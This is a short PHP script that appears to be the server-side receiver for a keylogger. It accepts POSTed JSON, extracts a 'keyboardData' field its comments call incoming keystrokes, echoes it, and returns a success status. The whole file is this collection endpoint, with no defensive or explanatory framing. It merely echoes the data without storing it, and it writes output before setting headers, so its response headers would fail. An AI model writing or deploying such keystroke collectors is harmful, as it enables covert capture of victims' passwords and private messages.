<?php
// Handle incoming POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the raw POST data
    $postData = file_get_contents('php://input');

    // Try to decode the JSON data
    $data = json_decode($postData, true);

    if (json_last_error() === JSON_ERROR_NONE) {
        $keyboardData = isset($data['keyboardData']) ? $data['keyboardData'] : '';

        // Print or log the incoming keystrokes data
        echo "Received data: " . htmlspecialchars($keyboardData) . "\n";

        // Respond with a JSON response
        header('Content-Type: application/json');
        echo json_encode(['status' => 'success']);
    } else {
        // Respond with an error for invalid JSON
        header('HTTP/1.1 400 Bad Request');
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON']);
    }
} else {
    // Respond with a method not allowed for non-POST requests
    header('HTTP/1.1 405 Method Not Allowed');
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
}
?>
